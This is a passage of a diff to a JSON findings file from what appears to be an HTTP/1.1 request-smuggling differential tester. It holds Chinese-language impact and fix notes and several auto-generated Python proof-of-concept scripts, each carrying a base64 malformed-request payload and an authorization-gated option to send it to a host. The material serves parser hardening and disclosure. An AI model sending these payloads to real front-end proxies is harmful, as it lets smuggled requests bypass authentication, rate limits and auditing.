字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_2eedc234.py"
     },
     {
@@ -341,13 +491,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-headers",
       "axis": "header_syntax",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 ` injected: fold` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-headers** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-headers",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 77,
       "sample_len": 60,
@@ -360,7 +525,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 823440d4，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_823440d4.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_823440d4.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '823440d4'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMHgzDQogaW5qZWN0ZWQ6IGZvbGQNCg0KYWJj')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 823440d4，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_823440d4.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_823440d4.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '823440d4'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-headers'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMHgzDQogaW5qZWN0ZWQ6IGZvbGQNCg0KYWJj')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_823440d4.py"
     },
     {
@@ -372,13 +537,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 58,
       "sample_len": 41,
@@ -391,7 +571,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 62ba123b，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_62ba123b.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_62ba123b.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '62ba123b'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 62ba123b，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_62ba123b.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_62ba123b.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '62ba123b'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_62ba123b.py"
     },
     {
@@ -403,13 +583,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 58,
       "sample_len": 41,
@@ -422,7 +617,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 70162be0，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_70162be0.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_70162be0.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '70162be0'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDT05URU5ULUxFTkdUSDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 70162be0，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_70162be0.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_70162be0.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '70162be0'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDT05URU5ULUxFTkdUSDogMw0KDQphYmM=')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_70162be0.py"
     },
     {
@@ -434,13 +629,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 59,
       "sample_len": 42,
@@ -453,7 +663,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
